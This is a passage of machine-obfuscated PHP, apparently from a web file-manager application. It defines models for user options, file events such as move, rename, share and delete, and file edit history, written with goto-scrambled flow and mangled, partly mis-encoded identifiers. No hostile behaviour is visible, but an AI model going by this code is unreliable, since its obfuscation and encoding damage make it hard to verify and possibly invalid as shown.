$Cö©ø®å‰[807]); goto CÔ£ƒÛÆÚ±; CÔ£ƒÛÆÚ±: $eœ‰¿½â‚ = array_to_keyvalue($aö†ğÍ²Ü, $Cö©ø®å‰[33], $Cö©ø®å‰[1443]); $this->_listAppendGroup($aö†ğÍ²Ü, $eœ‰¿½â‚); $this->_listAppendMeta($aö†ğÍ²Ü, $eœ‰¿½â‚); goto AäÀ¯ø…ÛŠ; AäÀ¯ø…ÛŠ: $this->_listAppendSourceRoot($aö†ğÍ²Ü, $eœ‰¿½â‚); goto c¤¬ğÕŒÃ; c¤¬ğÕŒÃ: } private function _listAppendSourceRoot(&$cÆ¥Ú÷ÄÖÃ, $Fé¶Åõ­œ—) { goto eËÜ¸çôÍ; CŠøŒ—Âîô: foreach ($cÆ¥Ú÷ÄÖÃ as &$dê»³É…²‡) { $dê»³É…²‡[$CíÖ”´ç÷[403]] = $dÊÀÉì©Úâ[$dê»³É…²‡[$CíÖ”´ç÷[1443]]] ? $dÊÀÉì©Úâ[$dê»³É…²‡[$CíÖ”´ç÷[1443]]] : array(); } unset($dê»³É…²‡); goto eó„ëšÊ í; eËÜ¸çôÍ: $CíÖ”´ç÷ =& $_SERVER[‡’¶øåüç˜]; $F†Ë‚œ¶£Ì = array($CíÖ”´ç÷[474] => 0, $CíÖ”´ç÷[383] => SourceModel::TYPE_USER, $CíÖ”´ç÷[469] => array($CíÖ”´ç÷[7], $Fé¶Åõ­œ—)); $b®ŠÇçå´´ = $CíÖ”´ç÷[2204]; goto E·òŒ°ã½–; E·òŒ°ã½–: $dÊÀÉì©Úâ = Model($CíÖ”´ç÷[758])->order($CíÖ”´ç÷[2205])->field($b®ŠÇçå´´)->where($F†Ë‚œ¶£Ì)->select(); $dÊÀÉì©Úâ = array_to_keyvalue($dÊÀÉì©Úâ, $CíÖ”´ç÷[469]); $dÊÀÉì©Úâ = array_remove_key($dÊÀÉì©Úâ, $CíÖ”´ç÷[469]); goto CŠøŒ—Âîô; eó„ëšÊ í: } private function _listAppendGroup(&$f«éÂæÚğ, $dôË¥É¾¤õ) { goto FößÜ•‡Şù; b®¿ø¼Ç: $D—µ¿É±Û = array($f«Â•ê¹Áã[2112] => array($f«Â•ê¹Áã[7], $dÍˆ‹ŞŠ¢¾)); $D‘—ßÂÓ½ê = Model($f«Â•ê¹Áã[2279])->field($f«Â•ê¹Áã[2567])->where($D—µ¿É±Û)->select(); $D‘—ßÂÓ½ê = array_to_keyvalue($D‘—ßÂÓ½ê, $f«Â•ê¹Áã[2112]); goto cˆâù­´°¡; DÍ¡Ñ£×É: foreach ($f«éÂæÚğ as &$eœìšÄ¾×’) { $eœìšÄ¾×’[$f«Â•ê¹Áã[2281]] = array(); if (isset($d¤»Â‡[$eœìšÄ¾×’[$f«Â•ê¹Áã[1443]]])) { $eœìšÄ¾×’[$f«Â•ê¹Áã[2281]] = $d¤»Â‡[$eœìšÄ¾×’[$f«Â•ê¹Áã[1443]]]; } } unset($eœìšÄ¾×’); goto e‰Ò‡ÃåïÆ; DøãÓÆö…: $dÍˆ‹ŞŠ¢¾ = array_to_keyvalue($d¤»Â‡, $f«Â•ê¹Áã[33], $f«Â•ê¹Áã[2112]); $dÍˆ‹ŞŠ¢¾ = array_remove_value(array_unique($dÍˆ‹ŞŠ¢¾), $f«Â•ê¹Áã[481]); if (!$dÍˆ‹ŞŠ¢¾ || !$d¤»Â‡) { return; } goto b®¿ø¼Ç; FößÜ•‡Şù: $f«Â•ê¹Áã =& $_SERVER[‡’¶øåüç˜]; $D—µ¿É±Û = array($f«Â•ê¹Áã[1443] => array($f«Â•ê¹Áã[7], $dôË¥É¾¤õ)); $d¤»Â‡ = Model($f«Â•ê¹Áã[2191])->where($D—µ¿É±Û)->select(); goto DøãÓÆö…; cˆâù­´°¡: $d¤»Â‡ = array_to_keyvalue_group($d¤»Â‡, $f«Â•ê¹Áã[1443]); foreach ($d¤»Â‡ as &$FµŠ˜¤…œ) { $BŞÜÉÇ½Ö’ = array(); foreach ($FµŠ˜¤…œ as $DÙ‰‘ÈÈ¿¼) { if (!$DÙ‰‘ÈÈ¿¼[$f«Â•ê¹Áã[2256]]) { continue; } $D•ŸÀ‚ºŞÎ = Model($f«Â•ê¹Áã[2275])->listData($DÙ‰‘ÈÈ¿¼[$f«Â•ê¹Áã[2256]]); $BŞÜÉÇ½Ö’[] = array($f«Â•ê¹Áã[2112] => $DÙ‰‘ÈÈ¿¼[$f«Â•ê¹Áã[2112]], $f«Â•ê¹Áã[2568] => $D‘—ßÂÓ½ê[$DÙ‰‘ÈÈ¿¼[$f«Â•ê¹Áã[2112]]][$f«Â•ê¹Áã[28]], $f«Â•ê¹Áã[472] => $D‘—ßÂÓ½ê[$DÙ‰‘ÈÈ¿¼[$f«Â•ê¹Áã[2112]]][$f«Â•ê¹Áã[472]], $f«Â•ê¹Áã[388] => $D•ŸÀ‚ºŞÎ); } $FµŠ˜¤…œ = $BŞÜÉÇ½Ö’; } unset($FµŠ˜¤…œ); goto DÍ¡Ñ£×É; e‰Ò‡ÃåïÆ: } private function _listAppendMeta(&$e§êÇƒ‹â§, $f—Ğ¾Òä‚ñ) { goto C‚—‘¥‚·; C‚—‘¥‚·: $cÒ•±ß˜ÁŠ =& $_SERVER[‡’¶øåüç˜]; $A­¯˜’¬ = UserJobModel::JOB_KEY; $e×Ò¦Ççø = array($cÒ•±ß˜ÁŠ[2547]); goto bºÍ¹±ÄÖí; d¯¡Ş®Õ‰Ä: foreach ($C˜œÈÓÈŞ as &$Cñœ©ï‰š„) { $a¸¾†‹×Ú– = array(); foreach ($Cñœ©ï‰š„ as $e©¤¸åÌ‚) { if (!in_array($e©¤¸åÌ‚[$cÒ•±ß˜ÁŠ[89]], $e×Ò¦Ççø)) { $a¸¾†‹×Ú–[$e©¤¸åÌ‚[$cÒ•±ß˜ÁŠ[89]]] = $e©¤¸åÌ‚[$cÒ•±ß˜ÁŠ[363]]; } } $Cñœ©ï‰š„ = $a¸¾†‹×Ú–; } unset($Cñœ©ï‰š„); $DÃÅ…ñ‚†Ä = Model($cÒ•±ß˜ÁŠ[2569]); goto dŒ— ­êÎÇ; bºÍ¹±ÄÖí: $f¯«¬¶¼“ = array($cÒ•±ß˜ÁŠ[1443] => array($cÒ•±ß˜ÁŠ[7], $f—Ğ¾Òä‚ñ)); $C˜œÈÓÈŞ = Model($cÒ•±ß˜ÁŠ[2544])->where($f¯«¬¶¼“)->select(); $C˜œÈÓÈŞ = array_to_keyvalue_group($C˜œÈÓÈŞ, $cÒ•±ß˜ÁŠ[1443]); goto d¯¡Ş®Õ‰Ä; dŒ— ­êÎÇ: foreach ($e§êÇƒ‹â§ as &$eæóÊÌÒĞÌ) { $A÷ŠÉ…å¶Í = array(); if (isset($C˜œÈÓÈŞ[$eæóÊÌÒĞÌ[$cÒ•±ß˜ÁŠ[1443]]])) { $A÷ŠÉ…å¶Í = $C˜œÈÓÈŞ[$eæóÊÌÒĞÌ[$cÒ•±ß˜ÁŠ[1443]]]; } $eæóÊÌÒĞÌ[$cÒ•±ß˜ÁŠ[2570]] = array(); if (isset($A÷ŠÉ…å¶Í[$A­¯˜’¬])) { $eæóÊÌÒĞÌ[$cÒ•±ß˜ÁŠ[2570]] = $DÃÅ…ñ‚†Ä->getUserJobInfo($A÷ŠÉ…å¶Í[$A­¯˜’¬]); } } unset($eæóÊÌÒĞÌ); goto bµÌ¼İ; bµÌ¼İ: } protected function groupUserAll($dƒƒÕ”á¾È) { $cäÁ¯¯²· =& $_SERVER[‡’¶øåüç˜]; if (!$dƒƒÕ”á¾È) { return !1; } $eÅÇ»è•è = Model($cäÁ¯¯²·[2191])->field($cäÁ¯¯²·[1443])->where(array($cäÁ¯¯²·[2112] => array($cäÁ¯¯²·[7], $dƒƒÕ”á¾È)))->select(); $eÅÇ»è•è = array_to_keyvalue($eÅÇ»è•è, $cäÁ¯¯²·[33], $cäÁ¯¯²·[1443]); return array_unique($eÅÇ»è•è); } public function userSearch($a¦Ê¼å¾à®, $aœ×ËÑ‰ñâ = "\x2a") { return Model($_SERVER[‡’¶øåüç˜][490])->where($a¦Ê¼å¾à®)->field($aœ×ËÑ‰ñâ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\162\x5f\x6f\160\164\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($cğ©«á´§ï) { $dÇ‚Ïó×äŞ =& $_SERVER[‡’¶øåüç˜]; if (!defined($dÇ‚Ïó×äŞ[438])) { define($dÇ‚Ïó×äŞ[438], 0); } return "\125\x73\x65\x72\117\x70\x74\151\157\x6e\x5f{$cğ©«á´§ï}\x5f" . USER_ID; } protected function filterWhere($E¾­î™–ÉÎ) { $e’ƒÛ¾·½‡ =& $_SERVER[‡’¶øåüç˜]; if (!defined($e’ƒÛ¾·½‡[438])) { define($e’ƒÛ¾·½‡[438], 0); } $E¾­î™–ÉÎ[$e’ƒÛ¾·½‡[1443]] = USER_ID; return $E¾­î™–ÉÎ; } public function cacheRemoveUser($d×ß‹çä, $aÈàŸò“) { return Cache::remove("\125\163\x65\162\117\x70\164\x69\157\156\x5f{$d×ß‹çä}\x5f" . $aÈàŸò“); } protected function optionDefault($DˆŒÃ—›çÇ = '') { $Bñ§åéŸÓ =& $_SERVER[‡’¶øåüç˜]; if ($DˆŒÃ—›çÇ == $Bñ§åéŸÓ[33]) { return $GLOBALS[$Bñ§åéŸÓ[6]][$Bñ§åéŸÓ[2571]]; } if ($DˆŒÃ—›çÇ == $Bñ§åéŸÓ[2572]) { return $GLOBALS[$Bñ§åéŸÓ[6]][$Bñ§åéŸÓ[2573]]; } } } goto C¸¬öÅØ¯·; BËîŞÑ¹êƒ: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\165\162\143\x65\x5f\x65\166\145\156\x74"; protected $dataAuto = array(array("\143\x72\x65\141\164\145\124\x69\155\x65", "\164\151\x6d\145", "\151\156\163\145\162\x74", "\x66\x75\x6e\143\164\151\157\x6e"), array("\x64\x65\163\x63", '', "\x69\156\x73\145\x72\164\54\165\x70\144\141\164\x65\x2c\163\145\154\x65\x63\x74", "\152\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($fåÛŠìÂÓª, $e™Ç‚ïÑí¯, $bÊ¯¯¼±Ä = '') { goto AÉ„ùÀÎ–; AÉ„ùÀÎ–: $A³ßƒôœ’ =& $_SERVER[‡’¶øåüç˜]; if (!$this->eventSave) { return; } $f·î‘ = Model($A³ßƒôœ’[1124])->sourceInfo($fåÛŠìÂÓª); goto bÖ‚‡Œ‘‚ß; fèôÏß“â©: $B¾Çâ·¡‡ = array($A³ßƒôœ’[395] => $fåÛŠìÂÓª, $A³ßƒôœ’[2315] => $f·î‘[$A³ßƒôœ’[474]], $A³ßƒôœ’[2316] => $f·î‘[$A³ßƒôœ’[28]], $A³ßƒôœ’[479] => $f·î‘[$A³ßƒôœ’[479]], $A³ßƒôœ’[1434] => USER_ID, $A³ßƒôœ’[400] => $e™Ç‚ïÑí¯, $A³ßƒôœ’[1436] => $bÊ¯¯¼±Ä); $this->addSystemLog($e™Ç‚ïÑí¯, $B¾Çâ·¡‡); return $this->add($B¾Çâ·¡‡); goto fì¾ÇæÏ“’; bÖ‚‡Œ‘‚ß: if (!$f·î‘) { return !1; } if ($this->isCacheEvent($f·î‘, $e™Ç‚ïÑí¯)) { return; } if ($bÊ¯¯¼±Ä && is_string($bÊ¯¯¼±Ä)) { $bÊ¯¯¼±Ä = array($A³ßƒôœ’[2143] => $bÊ¯¯¼±Ä); } goto fèôÏß“â©; fì¾ÇæÏ“’: } private function addSystemLog($f´ã¼Ø÷ò£, $c”¥êÁ‰‡) { $C‚°ÀÚ¨µ‹ =& $_SERVER[‡’¶øåüç˜]; if ($f´ã¼Ø÷ò£ == $C‚°ÀÚ¨µ‹[2317]) { $f´ã¼Ø÷ò£ = $c”¥êÁ‰‡[$C‚°ÀÚ¨µ‹[417]][$C‚°ÀÚ¨µ‹[2318]]; } else { if (in_array($f´ã¼Ø÷ò£, array($C‚°ÀÚ¨µ‹[2089], $C‚°ÀÚ¨µ‹[2319]))) { $f´ã¼Ø÷ò£ = $c”¥êÁ‰‡[$C‚°ÀÚ¨µ‹[417]][$C‚°ÀÚ¨µ‹[698]]; } } $EÌ°àÈ”¬ = array_merge($c”¥êÁ‰‡, array($C‚°ÀÚ¨µ‹[2320] => $c”¥êÁ‰‡[$C‚°ÀÚ¨µ‹[381]], $C‚°ÀÚ¨µ‹[2321] => $c”¥êÁ‰‡[$C‚°ÀÚ¨µ‹[2321]])); Model($C‚°ÀÚ¨µ‹[2052])->addLog($C‚°ÀÚ¨µ‹[2322] . $f´ã¼Ø÷ò£, $EÌ°àÈ”¬); } private function isCacheEvent($fÎ—æ¤, $D—°ôïÅ) { if ($fÎ—æ¤[$_SERVER[‡’¶øåüç˜][383]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($fĞ¨¢ßÅ™‹, $fªÛÌŒÌŒª) { $e­¹Ïµ´—Ñ =& $_SERVER[‡’¶øåüç˜]; $bë³½Ö±ğƒ = Model($e­¹Ïµ´—Ñ[1124])->sourceInfo($fĞ¨¢ßÅ™‹); $Eå­²í˜‹ = array($e­¹Ïµ´—Ñ[2318] => $fªÛÌŒÌŒª, $e­¹Ïµ´—Ñ[28] => $bë³½Ö±ğƒ[$e­¹Ïµ´—Ñ[28]]); return $this->addEvent($fĞ¨¢ßÅ™‹, $e­¹Ïµ´—Ñ[2317], $Eå­²í˜‹); } public function eventFileEdit($Dâ÷¯Íƒ×á) { $e©ù°‡Ô×™ =& $_SERVER[‡’¶øåüç˜]; $DÓ‚ì®ˆ = array($e©ù°‡Ô×™[2323] => $_SERVER[$e©ù°‡Ô×™[2324]], $e©ù°‡Ô×™[1756] => strtolower(ACTION)); return $this->addEvent($Dâ÷¯Íƒ×á, $e©ù°‡Ô×™[2079], $DÓ‚ì®ˆ); } public function eventRecycle($AÊÄÕ¬ˆÉ, $C‹†Å†•) { return $this->addEvent($AÊÄÕ¬ˆÉ, $_SERVER[‡’¶øåüç˜][2319], $C‹†Å†•); } public function eventRemove($B¨Ë¼‰¼Ğë) { $f²•¾èà–ñ =& $_SERVER[‡’¶øåüç˜]; $Dˆñ…­­‚ = Model($f²•¾èà–ñ[1124])->sourceInfo($B¨Ë¼‰¼Ğë); $bÏ–†©Ñƒ’ = $Dˆñ…­­‚[$f²•¾èà–ñ[28]]; return $this->addEvent($Dˆñ…­­‚[$f²•¾èà–ñ[474]], $f²•¾èà–ñ[2078], $bÏ–†©Ñƒ’); } public function eventShare($e”÷Ø“©Ïà, $e˜Ïµ”¤”í) { return $this->addEvent($e”÷Ø“©Ïà, $_SERVER[‡’¶øåüç˜][2089], $e˜Ïµ”¤”í); } public function eventMove($FÜ¾ŠÜ¸‹¹, $f‚»˜Ğ„Ÿ·, $fßÌÜõ‹ßö) { goto dƒ·ˆîˆªš; Aš‹ù«éÄ«: $this->addEvent($FÜ¾ŠÜ¸‹¹, $e…Ìß‹¡İ[505], $E‡×îÏæ¦³); $A´ë“Ø£ù = $F¯§ËŞÚ‚->sourceInfo($FÜ¾ŠÜ¸‹¹); $E‡×îÏæ¦³ = array($e…Ìß‹¡İ[381] => $A´ë“Ø£ù[$e…Ìß‹¡İ[381]], $e…Ìß‹¡İ[28] => $A´ë“Ø£ù[$e…Ìß‹¡İ[28]]); goto BŞê‘öÓ½; BŞê‘öÓ½: $this->addEvent($f‚»˜Ğ„Ÿ·, $e…Ìß‹¡İ[2329], $E‡×îÏæ¦³); goto dÓ²¦ö¹‹‹; BˆçÍ¬æö: $c”ªƒÖá‰ = $F¯§ËŞÚ‚->sourceInfo($f‚»˜Ğ„Ÿ·); $e«Ë Î¦¨ = $F¯§ËŞÚ‚->sourceInfo($fßÌÜõ‹ßö); $E‡×îÏæ¦³ = array($e…Ìß‹¡İ[1011] => $f‚»˜Ğ„Ÿ·, $e…Ìß‹¡İ[2325] => $c”ªƒÖá‰[$e…Ìß‹¡İ[28]], $e…Ìß‹¡İ[2326] => $c”ªƒÖá‰[$e…Ìß‹¡İ[479]], $e…Ìß‹¡İ[1012] => $fßÌÜõ‹ßö, $e…Ìß‹¡İ[2327] => $e«Ë Î¦¨[$e…Ìß‹¡İ[28]], $e…Ìß‹¡İ[2328] => $e«Ë Î¦¨[$e…Ìß‹¡İ[479]]); goto Aš‹ù«éÄ«; dƒ·ˆîˆªš: $e…Ìß‹¡İ =& $_SERVER[‡’¶øåüç˜]; $F¯§ËŞÚ‚ = Model($e…Ìß‹¡İ[1124]); $A´ë“Ø£ù = $F¯§ËŞÚ‚->sourceInfo($FÜ¾ŠÜ¸‹¹); goto BˆçÍ¬æö; dÓ²¦ö¹‹‹: } public function eventCopy($FÀÈã£ÃÛÓ) { $this->eventCreate($FÀÈã£ÃÛÓ, $_SERVER[‡’¶øåüç˜][503]); } public function eventRename($AÓ‡³˜¶Ã, $eˆ¿°éİ†², $c­¦„¾˜×Í) { $dİäµ÷ÓâÚ =& $_SERVER[‡’¶øåüç˜]; $e—ƒ‡‘é‚ = array($dİäµ÷ÓâÚ[1011] => $eˆ¿°éİ†², $dİäµ÷ÓâÚ[1012] => $c­¦„¾˜×Í); return $this->addEvent($AÓ‡³˜¶Ã, $dİäµ÷ÓâÚ[1137], $e—ƒ‡‘é‚); } public function eventAddComment($f¨¶ĞšÒ§, $D“®Ñ™Åí«) { return $this->addEvent($f¨¶ĞšÒ§, $_SERVER[‡’¶øåüç˜][2330], $D“®Ñ™Åí«); } public function eventAddDesc($b¿²Ô¸è´, $c‘÷ºÃ¯¿) { return $this->addEvent($b¿²Ô¸è´, $_SERVER[‡’¶øåüç˜][2331], $c‘÷ºÃ¯¿); } public function listBySource($CÆ¦Ş‰Ù¯) { goto b ˜Í’¢Âê; b•±ÀÒ”â: if ($b³¯¦öâïó[$f¼’Œ¸‘Ÿ[382]] == $f¼’Œ¸‘Ÿ[83]) { $d›”©Êê­Â = Model($f¼’Œ¸‘Ÿ[1124])->listSearchChildren($CÆ¦Ş‰Ù¯, 20000); $d›”©Êê­Â[] = $CÆ¦Ş‰Ù¯ . $f¼’Œ¸‘Ÿ[365]; $CèåÊ…âÁÃ = array($f¼’Œ¸‘Ÿ[381] => array($f¼’Œ¸‘Ÿ[7], $d›”©Êê­Â)); } $F°²¹°» æ = $this->where($CèåÊ…âÁÃ)->order($f¼’Œ¸‘Ÿ[2332])->selectPage(); if ($F°²¹°» æ[$f¼’Œ¸‘Ÿ[355]][$f¼’Œ¸‘Ÿ[356]] == 0) { $F°²¹°» æ[$f¼’Œ¸‘Ÿ[355]][$f¼’Œ¸‘Ÿ[356]] = 1; $F°²¹°» æ[$f¼’Œ¸‘Ÿ[358]] = array(array($f¼’Œ¸‘Ÿ[395] => $CÆ¦Ş‰Ù¯, $f¼’Œ¸‘Ÿ[2315] => $b³¯¦öâïó[$f¼’Œ¸‘Ÿ[474]], $f¼’Œ¸‘Ÿ[1434] => $b³¯¦öâïó[$f¼’Œ¸‘Ÿ[390]], $f¼’Œ¸‘Ÿ[400] => $f¼’Œ¸‘Ÿ[2333], $f¼’Œ¸‘Ÿ[401] => $b³¯¦öâïó[$f¼’Œ¸‘Ÿ[191]], $f¼’Œ¸‘Ÿ[1436] => $f¼’Œ¸‘Ÿ[33])); } goto B–®™Ó÷‹; B–®™Ó÷‹: return $this->eventListParse($F°²¹°» æ, $CÆ¦Ş‰Ù¯); goto CÖ×¶™ã£·; b ˜Í’¢Âê: $f¼’Œ¸‘Ÿ =& $_SERVER[‡’¶øåüç˜]; $b³¯¦öâïó = Model($f¼’Œ¸‘Ÿ[1124])->sourceInfo($CÆ¦Ş‰Ù¯); $CèåÊ…âÁÃ = array($f¼’Œ¸‘Ÿ[395] => $CÆ¦Ş‰Ù¯); goto b•±ÀÒ”â; CÖ×¶™ã£·: } private function eventListParse($EÌÆÎ•İÑš, $F™®ºšÕƒŞ) { goto fà˜çÛôÛ; aËÆ™ÅÒ÷: $EÌÆÎ•İÑš[$DÁÏ•Ç›œî[358]] = $f•Şª±ˆÏŠ; return $EÌÆÎ•İÑš; goto B°ê £”¶¯; BÈ“ÛİÍ´: $dœÃ¨¿Ñ¸± = array_unique($dœÃ¨¿Ñ¸±); $Cùù¸ßÁ¯ = array_unique(array_to_keyvalue($f•Şª±ˆÏŠ, $DÁÏ•Ç›œî[33], $DÁÏ•Ç›œî[1443])); $bç³ÆñÌŠÉ = Model($DÁÏ•Ç›œî[490])->userListInfo($Cùù¸ßÁ¯); goto fÏîé‡ëì©; E‘ôíÅ×éë: $B“ÃÑ‹Æ§˜ = array_to_keyvalue($f•Şª±ˆÏŠ, $DÁÏ•Ç›œî[33], $DÁÏ•Ç›œî[2321]); foreach ($f•Şª±ˆÏŠ as $A‡¬òæóŞĞ) { $Cì‘ø¹‡¦“ = $A‡¬òæóŞĞ[$DÁÏ•Ç›œî[417]]; if ($A‡¬òæóŞĞ[$DÁÏ•Ç›œî[29]] == $DÁÏ•Ç›œî[505] && isset($Cì‘ø¹‡¦“[$DÁÏ•Ç›œî[1011]])) { $dœÃ¨¿Ñ¸±[] = $Cì‘ø¹‡¦“[$DÁÏ•Ç›œî[1011]] . $DÁÏ•Ç›œî[33]; $dœÃ¨¿Ñ¸±[] = $Cì‘ø¹‡¦“[$DÁÏ•Ç›œî[1012]] . $DÁÏ•Ç›œî[33]; } if ($A‡¬òæóŞĞ[$DÁÏ•Ç›œî[29]] == $DÁÏ•Ç›œî[2329] && isset($Cì‘ø¹‡¦“[$DÁÏ•Ç›œî[381]])) { $dœÃ¨¿Ñ¸±[] = $Cì‘ø¹‡¦“[$DÁÏ•Ç›œî[381]] . $DÁÏ•Ç›œî[33]; } } $dœÃ¨¿Ñ¸± = array_merge($dœÃ¨¿Ñ¸±, $B“ÃÑ‹Æ§˜, array($F™®ºšÕƒŞ . $DÁÏ•Ç›œî[33])); goto BÈ“ÛİÍ´; fÏîé‡ëì©: $DŠåŠÙˆ®æ = Model($DÁÏ•Ç›œî[758])->sourceListInfo($dœÃ¨¿Ñ¸±, !0); foreach ($f•Şª±ˆÏŠ as &$A‡¬òæóŞĞ) { if ($A‡¬òæóŞĞ[$DÁÏ•Ç›œî[29]] == $DÁÏ•Ç›œî[505] && isset($A‡¬òæóŞĞ[$DÁÏ•Ç›œî[417]][$DÁÏ•Ç›œî[1011]])) { $A‡¬òæóŞĞ[$DÁÏ•Ç›œî[417]][$DÁÏ•Ç›œî[1011]] = $DŠåŠÙˆ®æ[$A‡¬òæóŞĞ[$DÁÏ•Ç›œî[417]][$DÁÏ•Ç›œî[1011]]]; $A‡¬òæóŞĞ[$DÁÏ•Ç›œî[417]][$DÁÏ•Ç›œî[1012]] = $DŠåŠÙˆ®æ[$A‡¬òæóŞĞ[$DÁÏ•Ç›œî[417]][$DÁÏ•Ç›œî[1012]]]; } if ($A‡¬òæóŞĞ[$DÁÏ•Ç›œî[29]] == $DÁÏ•Ç›œî[2329] && isset($A‡¬òæóŞĞ[$DÁÏ•Ç›œî[417]][$DÁÏ•Ç›œî[381]])) { $A‡¬òæóŞĞ[$DÁÏ•Ç›œî[417]][$DÁÏ•Ç›œî[381]] = $DŠåŠÙˆ®æ[$A‡¬òæóŞĞ[$DÁÏ•Ç›œî[417]][$DÁÏ•Ç›œî[381]]]; } $A‡¬òæóŞĞ[$DÁÏ•Ç›œî[403]] = $DŠåŠÙˆ®æ[$A‡¬òæóŞĞ[$DÁÏ•Ç›œî[381]]]; $A‡¬òæóŞĞ[$DÁÏ•Ç›œî[2334]] = $DŠåŠÙˆ®æ[$A‡¬òæóŞĞ[$DÁÏ•Ç›œî[2321]]]; if ($A‡¬òæóŞĞ[$DÁÏ•Ç›œî[29]] == $DÁÏ•Ç›œî[2078]) { $A‡¬òæóŞĞ[$DÁÏ•Ç›œî[2334]] = $A‡¬òæóŞĞ[$DÁÏ•Ç›œî[403]]; $A‡¬òæóŞĞ[$DÁÏ•Ç›œî[2321]] = $A‡¬òæóŞĞ[$DÁÏ•Ç›œî[2334]][$DÁÏ•Ç›œî[381]]; $A‡¬òæóŞĞ[$DÁÏ•Ç›œî[403]] = !1; $A‡¬òæóŞĞ[$DÁÏ•Ç›œî[381]] = $DÁÏ•Ç›œî[33]; } $A‡¬òæóŞĞ[$DÁÏ•Ç›œî[2265]] = $bç³ÆñÌŠÉ[$A‡¬òæóŞĞ[$DÁÏ•Ç›œî[1443]]]; } unset($A‡¬òæóŞĞ); goto aËÆ™ÅÒ÷; fà˜çÛôÛ: $DÁÏ•Ç›œî =& $_SERVER[‡’¶øåüç˜]; $f•Şª±ˆÏŠ = $EÌÆÎ•İÑš[$DÁÏ•Ç›œî[358]]; $dœÃ¨¿Ñ¸± = array_to_keyvalue($f•Şª±ˆÏŠ, $DÁÏ•Ç›œî[33], $DÁÏ•Ç›œî[381]); goto E‘ôíÅ×éë; B°ê £”¶¯: } public function removeBySource($D¥¤ ƒóæ) { $bÄæ½Üí£± = array($_SERVER[‡’¶øåüç˜][395] => $D¥¤ ƒóæ); $this->where($bÄæ½Üí£±)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\165\162\x63\145\x5f\x68\x69\x73\164\157\x72\171"; public function addHistory($BçÙîáæ‰Á, $CÓµ‰¤ÏéŸ = '') { $e±ß†Äœ®‚ =& $_SERVER[‡’¶øåüç˜]; $a¦Çƒ¾Ø†÷ = array($e±ß†Äœ®‚[395] => $BçÙîáæ‰Á[$e±ß†Äœ®‚[381]], $e±ß†Äœ®‚[1434] => isset($BçÙîáæ‰Á[$e±ß†Äœ®‚[391]]) ? $BçÙîáæ‰Á[$e±ß†Äœ®‚[391]] : $BçÙîáæ‰Á[$e±ß†Äœ®‚[390]], $e±ß†Äœ®‚[432] => $BçÙîáæ‰Á[$e±ß†Äœ®‚[431]], $e±ß†Äœ®‚[533] => $BçÙîáæ‰Á[$e±ß†Äœ®‚[77]], $e±ß†Äœ®‚[2335] => $CÓµ‰¤ÏéŸ); $EÀİêàĞ‰ = $GLOBALS[$e±ß†Äœ®‚[6]][$e±ß†Äœ®‚[84]][$e±ß†Äœ®‚[2336]]; if ($EÀİêàĞ‰ > 1) { $this->historyAutoClear($a¦Çƒ¾Ø†÷[$e±ß†Äœ®‚[381]]); $this->add($a¦Çƒ¾Ø†÷); } Model($e±ß†Äœ®‚[2337])->eventFileEdit($BçÙîáæ‰Á[$e±ß†Äœ®‚[381]]); } private function historyAutoClear($b¾¢ø×ÙÕ) { goto E²Ü†–¤Ò; eæ¥‹†¥ó: if ($F¸äÓ¼»° >= 500) { return; } $DÏá…İéî¥ = array($AøŠ¦ÓÁ–ƒ[395] => $b¾¢ø×ÙÕ); $F›ğğŠ Œ» = $this->field($AøŠ¦ÓÁ–ƒ[2340])->where($DÏá…İéî¥)->order($AøŠ¦ÓÁ–ƒ[2332])->select(); goto D¶çØ—½é¥; E²Ü†–¤Ò: $AøŠ¦ÓÁ–ƒ =& $_SERVER[‡’¶øåüç˜]; $F“ƒ»…ö‚³ = Model($AøŠ¦ÓÁ–ƒ[1095])->get($AøŠ¦ÓÁ–ƒ[2338]); $Cñæí¢«¡¸ = $GLOBALS[$AøŠ¦ÓÁ–ƒ[6]][$AøŠ¦ÓÁ–ƒ[84]][$AøŠ¦ÓÁ–ƒ[2336]]; goto eÎà„§‘‡; D¶çØ—½é¥: if (!$F›ğğŠ Œ» || $F¸äÓ¼»° >= count($F›ğğŠ Œ»)) { return; } $c¶¿¨ª¥Ù = array_to_keyvalue($F›ğğŠ Œ», $AøŠ¦ÓÁ–ƒ[33], $AøŠ¦ÓÁ–ƒ[371]); $c¶¿¨ª¥Ù = array_slice($c¶¿¨ª¥Ù, $F¸äÓ¼»°); goto C¶à†²‡; eÎà„§‘‡: $cØÔæÓ•õ = $F“ƒ»…ö‚³ == $AøŠ¦ÓÁ–ƒ[2339] ? 3 : $Cñæí¢«¡¸; if ($Cñæí¢«¡¸ <= 1) { $cØÔæÓ•õ = 1; } $F¸äÓ¼»° = $cØÔæÓ•õ - 1; goto eæ¥‹†¥ó; C¶à†²‡: $aòÍ²åµ‰ = array_to_keyvalue($F›ğğŠ Œ», $AøŠ¦ÓÁ–ƒ[33], $AøŠ¦ÓÁ–ƒ[431]); $aòÍ²åµ‰ = array_slice($aòÍ²åµ‰, $F¸äÓ¼»°); if (!$c¶¿¨ª¥Ù || !$aòÍ²åµ‰) { return; } goto aœÀª²Ÿ½™; aœÀª²Ÿ½™: $DÏá…İéî¥ = array($AøŠ¦ÓÁ–ƒ[397] => array($AøŠ¦ÓÁ–ƒ[7], $c¶¿¨ª¥Ù)); $this->where($DÏá…İéî¥)->delete(); Model($AøŠ¦ÓÁ–ƒ[434])->remove($aòÍ²åµ‰); goto F»¯Ú…â; F»¯Ú…â: } public function listData($BÕŠ×…˜™Š) { goto d“©ç‰ÏõÙ; B‰ÃÚ‰ë: $fª ›•• = $this->field($aÑ‚¥ÙÆÕƒ)->where($Fàã¤ÏğØ¼)->order($F·òÅñÏõ[2332])->selectPage(); $this->_listAppendUser($fª ›••[$F·òÅñÏõ[358]]); $b¹«‹ÚÔà = Model($F·òÅñÏõ[1095])->get($F·òÅñÏõ[2338]); goto eäÏöê»¢Ú; d“©ç‰ÏõÙ: $F·òÅñÏõ =& $_SERVER[‡’¶øåüç˜]; $Fàã¤ÏğØ¼ = array($F·òÅñÏõ[395] => $BÕŠ×…˜™Š); $aÑ‚¥ÙÆÕƒ = $F·òÅñÏõ[2341]; goto 